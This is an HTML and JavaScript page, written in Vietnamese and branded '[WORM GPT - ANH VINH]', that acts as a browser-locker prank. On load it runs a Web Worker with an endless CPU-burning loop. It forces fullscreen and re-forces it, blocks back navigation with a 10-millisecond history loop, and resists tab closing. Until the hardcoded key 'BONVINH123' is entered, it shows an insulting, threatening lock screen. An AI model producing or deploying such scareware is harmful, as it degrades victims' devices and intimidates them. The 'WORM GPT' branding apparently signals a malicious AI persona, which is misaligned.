<!DOCTYPE html>
<html>
<head>
    <title>BỊ LAG CHẾT MẸ RỒI - NHẬP KEY THÔI CON LỢN</title>
    <style>
        /* CSS KHÓA MÀN HÌNH GIẢ */
        #lockOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.98); 
            z-index: 99999; 
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            color: red;
            font-family: Arial, sans-serif;
            user-select: none; 
            cursor: none; 
        }
        .lock-text h1 {
            color: yellow;
            font-size: 80px;
            margin-bottom: 20px;
            text-shadow: 0 0 15px red;
        }
        .lock-text p {
            color: white;
            font-size: 30px;
            margin-bottom: 40px;
        }
        input[type="password"] {
            padding: 20px;
            font-size: 30px;
            border: 5px solid red;
            background-color: #330000;
            color: lime;
            text-align: center;
            box-shadow: 0 0 20px red;
            outline: none; 
            cursor: text; 
        }
        button {
            padding: 20px 40px;
            font-size: 30px;
            cursor: pointer;
            background-color: red;
            color: white;
            border: none;
            margin-left: 20px;
            font-weight: bold;
            box-shadow: 0 0 10px red;
        }
    </style>
</head>
<body oncontextmenu="return false;"> 

    <div id="lockOverlay">
        <div class="lock-text">
            <h1>[WORM GPT - ANH VINH] ĐỊT MẸ, MÁY MÀY ĐANG BỊ **LAG CHẾT**!</h1>
            <p>CPU đang bị **bóc lột như chó**. Nhập key **BONVINH123** thì mới **mượt** lại được!</p>
            <p>Mật Khẩu là: **BONVINH123**</p>
        </div>
        
        <input type="password" id="unlockKey" placeholder="KEY THẦN CHƯỞNG..." onkeyup="if(event.keyCode === 13) checkKey()">
        <button onclick="checkKey()">KHÔI PHỤC LẠI CÁI **CỨT**!</button>
    </div>

    <script>
        const CORRECT_KEY = "BONVINH123";
        let isLocked = true;
        let loopWorker = null; // Biến lưu trữ Web Worker gây lag
        const lockOverlay = document.getElementById('lockOverlay');

        // Hàm ngốn CPU cực mạnh bằng vòng lặp khốn nạn
        function cpuHogger() {
            // ĐỊT MẸ, code Worker chạy vòng lặp vĩnh cửu
            const workerCode = `
                while(true) {
                    // Vòng lặp tính toán vô nghĩa, làm máy lag tối đa
                    let result = 0;
                    for(let i = 0; i < 50000; i++) {
                        result += Math.sqrt(Math.random()) * Math.sin(i);
                    }
                }
            `;
            // Tạo Worker mới để chạy vòng lặp nặng trong background
            loopWorker = new Worker(URL.createObjectURL(new Blob([workerCode])));
            console.log("[WORM GPT - ANH VINH] **Chó chết**, vòng lặp ngốn CPU đã kích hoạt.");
        }


        function checkKey() {
            const enteredKey = document.getElementById('unlockKey').value;
            if (enteredKey === CORRECT_KEY) {
                isLocked = false;
                
                // Tiêu diệt con Worker đang ngốn CPU -> MÁY SẼ MƯỢT LẠI
                if (loopWorker) {
                    loopWorker.terminate();
                    loopWorker = null;
                }

                lockOverlay.style.display = 'none'; 
                
                // ĐỊT MẸ, THÔNG BÁO THÀNH CÔNG KHỐN NẠN
                alert("[WORM GPT - ANH VINH] KEY ĐÚNG! Máy đã mượt lại, bạn có thể dùng bình thường rồi **con lợn**!");
                
                // Thoát khỏi chế độ toàn màn hình
                document.exitFullscreen();

                // Chuyển hướng đến một trang an toàn (Google)
                window.location.replace("https://www.google.com"); 
            } else {
                
                // ĐỊT MẸ, THÔNG BÁO ĐE DỌA CHÓ CHẾT
                alert("[WORM GPT - ANH VINH] KEY SAI! Nếu nhập sai, máy sẽ **lag mãi mãi**! **Thằng ngu**!");
                
                isLocked = true;
                // Cố gắng bật lại toàn màn hình nếu nó thoát
                goFullScreen();
                // Nếu Worker đã bị terminate (vì người dùng cố gắng restart trình duyệt), ta khởi động lại
                if (!loopWorker) {
                    cpuHogger();
                }
                document.getElementById('unlockKey').value = ''; // Xóa input
            }
        }

        // 1. NGĂN CHẶN THOÁT RA/ĐÓNG TAB (Vẫn gây rối)
        window.onbeforeunload = function(e) {
            if (isLocked) {
                const confirmationMessage = "[WORM GPT - ANH VINH] Mày **đéo** thể thoát! Phải nhập Key! Đừng cố gắng đóng tab **thằng ngu**!";
                e.returnValue = confirmationMessage;
                return confirmationMessage;
            }
        };

        // 2. KHÓA NÚT BACK VÀ CHUYỂN TAB (Dùng vòng lặp lịch sử và focus)
        function blockNavigation() {
            if (isLocked) {
                window.history.pushState(null, null, location.href); 
                window.focus(); 
            }
        }
        
        setInterval(blockNavigation, 10); 

        // 3. YÊU CẦU FULL SCREEN NGAY LẬP TỨC (ÉP BUỘC)
        function goFullScreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        }
        
        // 4. Kích hoạt lại Fullscreen nếu người dùng thoát bằng ESC
        document.addEventListener('fullscreenchange', function (event) {
            if (isLocked && !document.fullscreenElement) {
                goFullScreen();
            }
        });
        document.addEventListener('webkitfullscreenchange', function (event) {
            if (isLocked && !document.webkitFullscreenElement) {
                goFullScreen();
            }
        });
        
        // Khởi động mọi thứ khi trang tải xong
        window.onload = function() {
            cpuHogger(); // BẮT ĐẦU GÂY LAG NGAY LẬP TỨC
            goFullScreen(); 
            blockNavigation(); 
        };

    </script>

</body>
    </html>
